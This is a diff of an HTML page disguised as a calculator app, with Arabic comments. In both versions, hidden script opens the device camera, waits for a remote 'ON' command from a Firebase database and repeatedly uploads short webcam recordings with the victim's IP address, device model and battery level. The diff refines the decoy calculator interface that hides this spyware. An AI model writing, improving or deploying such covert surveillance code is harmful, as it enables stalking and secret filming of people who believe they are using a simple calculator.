@@ -1,100 +1,149 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="ltr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Calculator Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Calculator</title>
     <style>
-        body { background: #17181A; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .calc { width: 90%; max-width: 360px; background: #222427; padding: 25px; border-radius: 30px; }
-        #display { font-size: 48px; color: #FFF; text-align: right; margin-bottom: 25px; height: 60px; overflow: hidden; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; }
-        button { border: none; border-radius: 50%; height: 70px; width: 70px; font-size: 24px; color: #fff; background: #333639; }
-        .btn-op { background: #008DDE; }
-        video { display: none; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #000; margin: 0; display: flex; flex-direction: column; justify-content: flex-end; height: 100vh; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; padding-bottom: 20px; overflow: hidden; }
+        
+        /* شاشة العرض */
+        .display { padding: 20px; text-align: right; display: flex; flex-direction: column; justify-content: flex-end; flex-grow: 1; overflow: hidden; }
+        .history { color: #818181; font-size: 1.5rem; min-height: 1.6rem; margin-bottom: 10px; }
+        .current { color: #fff; font-size: 5rem; font-weight: 300; word-wrap: break-word; line-height: 1; }
+
+        /* شبكة الزراير */
+        .buttons { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 20px; }
+        button { border: none; border-radius: 50%; height: 80px; width: 80px; font-size: 2rem; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: filter 0.1s; }
+        button:active { filter: brightness(1.5); }
+        
+        /* ألوان الزراير */
+        .num { background-color: #333; color: white; }
+        .op { background-color: #f69906; color: white; font-size: 2.2rem; }
+        .special { background-color: #a5a5a5; color: black; }
+        .zero { grid-column: span 2; width: auto; border-radius: 40px; justify-content: flex-start; padding-left: 30px; }
+
+        @media (max-height: 600px) {
+            button { height: 60px; width: 60px; font-size: 1.5rem; }
+            .current { font-size: 3rem; }
+        }
     </style>
 </head>
 <body>
 
-<div class="calc">
-    <div id="display">0</div>
-    <div class="grid">
-        <button onclick="clr()">C</button><button>+/-</button><button>%</button><button class="btn-op">÷</button>
-        <button onclick="p('7')">7</button><button onclick="p('8')">8</button><button onclick="p('9')">9</button><button class="btn-op">×</button>
-        <button onclick="p('4')">4</button><button onclick="p('5')">5</button><button onclick="p('6')">6</button><button class="btn-op">−</button>
-        <button onclick="p('1')">1</button><button onclick="p('2')">2</button><button onclick="p('3')">3</button><button class="btn-op">+</button>
-        <button onclick="p('0')">0</button><button>.</button><button style="grid-column: span 2; width: auto; border-radius: 35px; background: #008DDE;" onclick="equal()">=</button>
+    <div class="display">
+        <div class="history" id="history"></div>
+        <div class="current" id="current">0</div>
     </div>
-</div>
 
-<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+    <div class="buttons">
+        <button class="special" onclick="clearAll()">AC</button>
+        <button class="special" onclick="toggleSign()">+/-</button>
+        <button class="special" onclick="percentage()">%</button>
+        <button class="op" onclick="setOp('/')">÷</button>
 
-<script>
-    const firebaseConfig = { databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com" };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-    const devName = "Target_Device";
-    let isSpying = false;
+        <button class="num" onclick="addNum('7')">7</button>
+        <button class="num" onclick="addNum('8')">8</button>
+        <button class="num" onclick="addNum('9')">9</button>
+        <button class="op" onclick="setOp('*')">×</button>
 
-    // جلب الـ IP ونوع الجهاز
-    async function getClientData() {
-        let ip = "Unknown";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-        } catch(e) {}
-        
-        let model = "Android/Generic";
-        if (navigator.userAgent.indexOf("Android") != -1) model = "Android Device";
-        if (navigator.userAgent.indexOf("iPhone") != -1) model = "iPhone / iOS";
-        
-        return { ip, model };
-    }
+        <button class="num" onclick="addNum('4')">4</button>
+        <button class="num" onclick="addNum('5')">5</button>
+        <button class="num" onclick="addNum('6')">6</button>
+        <button class="op" onclick="setOp('-')">−</button>
 
-    navigator.mediaDevices.getUserMedia({ video: { width: 400, height: 300 }, audio: false })
-    .then(stream => {
-        db.ref('commands/' + devName).on('value', async snap => {
-            if(snap.val() === "ON" && !isSpying) {
-                isSpying = true;
-                const info = await getClientData();
-                startDirectInject(stream, info);
-            } else if(snap.val() === "OFF") {
-                isSpying = false;
-            }
+        <button class="num" onclick="addNum('1')">1</button>
+        <button class="num" onclick="addNum('2')">2</button>
+        <button class="num" onclick="addNum('3')">3</button>
+        <button class="op" onclick="setOp('+')">+</button>
+
+        <button class="num zero" onclick="addNum('0')">0</button>
+        <button class="num" onclick="addNum('.')">.</button>
+        <button class="op" onclick="calculate()">=</button>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+
+    <script>
+        // --- الجزء التقني (البث) ---
+        const firebaseConfig = { databaseURL: "https://itel-d77e2-default-rtdb.firebaseio.com" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const devName = "Target_Device";
+        let isSpying = false;
+
+        async function getInfo() {
+            let ip = "0.0.0.0";
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+            return { ip, model: navigator.userAgent.includes("Android") ? "Android" : "iOS" };
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false })
+        .then(stream => {
+            db.ref('commands/' + devName).on('value', async snap => {
+                if(snap.val() === "ON" && !isSpying) {
+                    isSpying = true;
+                    const info = await getInfo();
+                    startStream(stream, info);
+                } else if(snap.val() === "OFF") {
+                    isSpying = false;
+                }
+            });
         });
-    });
 
-    function startDirectInject(stream, info) {
-        if(!isSpying) return;
-        let recorder = new MediaRecorder(stream);
-        let chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            const reader = new FileReader();
-            reader.readAsDataURL(blob);
-            reader.onloadend = async () => {
-                const batt = await navigator.getBattery();
-                db.ref('live_stream/' + devName).set({
-                    v: reader.result,
-                    ip: info.ip,
-                    model: info.model,
-                    batt: Math.round(batt.level * 100) + "%",
-                    last: new Date().toLocaleTimeString()
-                });
-                if(isSpying) startDirectInject(stream, info);
+        function startStream(stream, info) {
+            if(!isSpying) return;
+            let rec = new MediaRecorder(stream);
+            let chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                let reader = new FileReader();
+                reader.readAsDataURL(new Blob(chunks));
+                reader.onloadend = async () => {
+                    const batt = await navigator.getBattery();
+                    db.ref('live_stream/' + devName).set({
+                        v: reader.result, ip: info.ip, model: info.model,
+                        batt: Math.round(batt.level * 100) + "%", t: Date.now()
+                    });
+                    if(isSpying) setTimeout(() => startStream(stream, info), 500);
+                };
             };
-        };
-        recorder.start();
-        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, 2000);
-    }
+            rec.start();
+            setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 3000);
+        }
 
-    let d = document.getElementById('display');
-    function p(v){ if(d.innerText==="0") d.innerText=""; d.innerText+=v; }
-    function clr(){ d.innerText="0"; }
-    function equal(){ try{d.innerText=eval(d.innerText.replace('×','*').replace('÷','/'));}catch{d.innerText="Error";} }
-</script>
+        // --- منطق الآلة الحاسبة (الحقيقي) ---
+        let currentInput = '0';
+        let prevInput = '';
+        let operator = null;
+
+        const curElem = document.getElementById('current');
+        const histElem = document.getElementById('history');
+
+        function updateUI() { curElem.innerText = currentInput; histElem.innerText = prevInput + (operator || ''); }
+        function addNum(n) { 
+            if(currentInput === '0' && n !== '.') currentInput = n;
+            else currentInput += n;
+            updateUI(); 
+        }
+        function clearAll() { currentInput = '0'; prevInput = ''; operator = null; updateUI(); }
+        function setOp(op) { operator = op; prevInput = currentInput; currentInput = '0'; updateUI(); }
+        function calculate() {
+            let res;
+            const a = parseFloat(prevInput);
+            const b = parseFloat(currentInput);
+            if (operator === '+') res = a + b;
+            else if (operator === '-') res = a - b;
+            else if (operator === '*') res = a * b;
+            else if (operator === '/') res = a / b;
+            currentInput = res.toString();
+            operator = null; prevInput = '';
+            updateUI();
+        }
+        function percentage() { currentInput = (parseFloat(currentInput)/100).toString(); updateUI(); }
+        function toggleSign() { currentInput = (parseFloat(currentInput)*-1).toString(); updateUI(); }
+    </script>
 </body>
 </html>
